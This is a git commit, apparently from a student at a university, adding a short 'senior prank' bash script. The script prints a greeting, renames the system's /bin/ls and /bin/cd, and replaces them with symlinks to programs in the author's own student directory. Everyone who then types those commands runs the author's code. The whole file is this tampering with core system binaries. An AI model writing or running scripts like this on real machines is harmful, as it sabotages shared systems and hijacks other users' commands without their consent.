90f9cb8eb2516e923c70d35f2c389d3e4d534ef1
Sunnia Ye <sye2@wellesley.edu>
2017-04-26 15:59:37 -0400

    senior prank bash script

---
+++ mwahaha.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+echo "Happy Senior Prank! Love, CS Majors '17"
+mv /bin/ls /bin/ls_orig
+mv /bin/cd /bin/cd_orig
+ln -s /students/sye2/msnake/build/ls /bin/ls
+ln -s /students/sye2/msnake/build/cd /bin/cd
